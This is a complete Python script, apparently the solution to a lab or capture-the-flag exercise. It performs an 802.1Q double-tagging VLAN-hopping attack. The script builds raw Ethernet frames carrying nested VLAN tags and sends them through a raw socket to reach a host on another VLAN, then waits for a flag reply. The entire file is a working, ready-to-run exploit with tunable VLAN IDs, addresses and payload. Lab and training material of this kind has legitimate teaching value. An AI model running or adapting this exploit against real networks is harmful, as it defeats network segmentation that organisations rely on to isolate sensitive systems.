#!/usr/bin/env python3
"""802.1Q double-tagging exploit for the double-tagging lab.

Run as root inside attacker-client:

    sudo python3 double_tag.py

The frame is built with struct and sent via AF_PACKET, so no scapy is needed.
It is sent to the broadcast MAC because the attacker cannot ARP inside VLAN 20;
the victim's unicast IP is still accepted inside the broadcast L2 frame.
"""

import argparse
import socket
import struct
import sys


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    words = struct.unpack("!%dH" % (len(data) // 2), data)
    total = sum(words)
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def mac_to_bytes(mac: str) -> bytes:
    parts = mac.strip().split(":")
    if len(parts) != 6:
        raise ValueError(f"invalid MAC address: {mac!r}")
    return bytes(int(part, 16) for part in parts)


def build_frame(args: argparse.Namespace, src_mac: bytes) -> bytes:
    payload = args.payload.encode()
    udp = struct.pack("!HHHH", args.sport, args.dport, 8 + len(payload), 0) + payload

    total_len = 20 + len(udp)
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        total_len,
        0,
        0,
        64,
        socket.IPPROTO_UDP,
        0,
        socket.inet_aton(args.src_ip),
        socket.inet_aton(args.dst_ip),
    )
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]

    # Ethernet | 802.1Q(outer) | 802.1Q(inner) | IPv4 | UDP
    return (
        b"\xff" * 6  # broadcast destination MAC
        + src_mac
        + struct.pack("!HH", 0x8100, args.outer_vlan & 0x0FFF)
        + struct.pack("!HH", 0x8100, args.inner_vlan & 0x0FFF)
        + struct.pack("!H", 0x0800)
        + ip
        + udp
    )


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", default="eth1")
    parser.add_argument("--src-ip", default="192.168.0.137")
    parser.add_argument("--dst-ip", default="192.168.20.10")
    parser.add_argument("--outer-vlan", type=int, default=10)
    parser.add_argument("--inner-vlan", type=int, default=20)
    parser.add_argument("--sport", type=int, default=4444)
    parser.add_argument("--dport", type=int, default=1337)
    parser.add_argument("--payload", default="please-send-the-flag")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--attempts", type=int, default=3)
    args = parser.parse_args()

    try:
        with open(f"/sys/class/net/{args.iface}/address", "r", encoding="utf-8") as f:
            src_mac = mac_to_bytes(f.read())
    except OSError as exc:
        print(f"[-] cannot read MAC of {args.iface}: {exc}", file=sys.stderr)
        return 1

    frame = build_frame(args, src_mac)

    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rx.bind(("0.0.0.0", args.sport))
    rx.settimeout(args.timeout)

    tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    tx.bind((args.iface, 0))

    for attempt in range(1, args.attempts + 1):
        print(
            f"[*] attempt {attempt}: sending double-tagged frame on {args.iface} "
            f"(outer={args.outer_vlan}, inner={args.inner_vlan})"
        )
        tx.send(frame)
        try:
            data, addr = rx.recvfrom(4096)
        except socket.timeout:
            continue
        print(f"[+] reply from {addr[0]}:{addr[1]}: {data.decode(errors='replace').strip()}")
        return 0

    print("[-] no reply (check the topology, rp_filter, and the router firewall)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
